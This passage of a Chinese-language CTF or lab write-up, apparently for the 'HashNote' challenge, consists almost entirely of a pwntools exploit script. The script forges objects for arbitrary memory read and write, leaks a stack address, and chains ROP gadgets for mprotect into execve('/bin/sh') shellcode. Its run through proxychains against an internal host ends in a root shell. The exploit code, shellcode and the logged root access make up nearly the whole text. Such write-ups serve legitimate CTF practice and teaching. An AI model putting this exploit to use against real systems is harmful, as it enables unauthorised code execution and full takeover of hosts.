plain">sendafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;New username:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Authenticate</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;Username:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;123&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;Password:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;freep@ssw0rd:3&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Add entries to setup the environment</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add_entry</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;aabP&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;aaaaaaaa&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add_entry</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;aace&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;C&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xc0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Shellcode to spawn a shell</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">b&#x27;\x6a\x3b&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">                   </span><span class="token comment" style="color:#999988;font-style:italic"># push   0x3b</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">b&#x27;\x58&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">                       </span><span class="token comment" style="color:#999988;font-style:italic"># pop    rax</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">b&#x27;\x99&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">                       </span><span class="token comment" style="color:#999988;font-style:italic"># cdq</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">b&#x27;\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># movabs rbx, 0x68732f6e69622f2f</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">b&#x27;\x53&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">                       </span><span class="token comment" style="color:#999988;font-style:italic"># push   rbx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">b&#x27;\x48\x89\xe7&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">               </span><span class="token comment" style="color:#999988;font-style:italic"># mov    rdi, rsp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">b&#x27;\x52&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">                       </span><span class="token comment" style="color:#999988;font-style:italic"># push   rdx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">b&#x27;\x57&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">                       </span><span class="token comment" style="color:#999988;font-style:italic"># push   rdi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">b&#x27;\x48\x89\xe6&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">               </span><span class="token comment" style="color:#999988;font-style:italic"># mov    rsi, rsp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">b&#x27;\x0f\x05&#x27;</span><span class="token plain">                    </span><span class="token comment" style="color:#999988;font-style:italic"># syscall</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">username_addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x5dc980</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_obj_addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> username_addr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">arbitrary_read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fake_obj_addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xdeadbeef</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fake_obj </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fake_obj_addr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fake_obj </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;aahO&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;\x00&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fake_obj </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;aaaaaaaa&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> fake_obj</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> shellcode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">128</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;\x00&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set_username</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    get_entry</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;aahO&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">arbitrary_write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fake_obj_addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xdeadbeef</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fake_obj </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fake_obj_addr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fake_obj </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;aahO&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;\x00&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fake_obj </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;aaaaaaaa&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> fake_obj</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> shellcode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">128</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;\x00&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set_username</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    update_entry</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;aahO&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Leak the stack address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">environ </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x5e4c38</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">arbitrary_read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">environ</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stack_addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> u64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvuntil</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;\x7f&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> drop</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;\0&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">success</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;stack_addr&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> stack_addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ROP gadgets</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rdi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0000000000405e7c</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rsi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x000000000040974f</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rax </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00000000004206ba</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rdx_rbx </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x000000000053514b</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shr_eax_2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0000000000523f2e</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall_ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00000000004d9776</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ROP payload to map memory and jump to shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">username_addr </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">~</span><span class="token number" style="color:#36acaa">0xfff</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rsi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x1000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rdx_rbx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">7</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rax</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xa</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shr_eax_2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">syscall_ret</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">username_addr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">arbitrary_write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">stack_addr </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x210</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;uname -ar&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>借助 <code>proxychains</code> 将 python 脚本代理到内网中的靶机</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">env</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tmp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 python3 pwn-exploit.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> config </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> DLL init: proxychains-ng </span><span class="token number" style="color:#36acaa">4.17</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;/home/randark/tmp/HashNote&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Arch:       amd64-64-little</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    RELRO:      Partial RELRO</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Stack:      No canary found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NX:         NX enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PIE:        No PIE </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">0x400000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SHSTK:      Enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IBT:        Enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">O</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Opening connection to </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.33 on port </span><span class="token number" style="color:#36acaa">59696</span><span class="token plain">: Trying </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.33  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">o</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Opening connection to </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.33 on port </span><span class="token number" style="color:#36acaa">59696</span><span class="token plain">: Done</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DEBUG</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Sent 0x7 bytes:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    b</span><span class="token string" style="color:#e3116c">&#x27;whoami\n&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DEBUG</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Received 0x5 bytes:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    b</span><span class="token string" style="color:#e3116c">&#x27;root\n&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag---03">flag - 03<a href="#flag---03" class="hash-link" aria-label="flag - 03的直接链接" title="flag - 03的直接链接">​</a></h2>
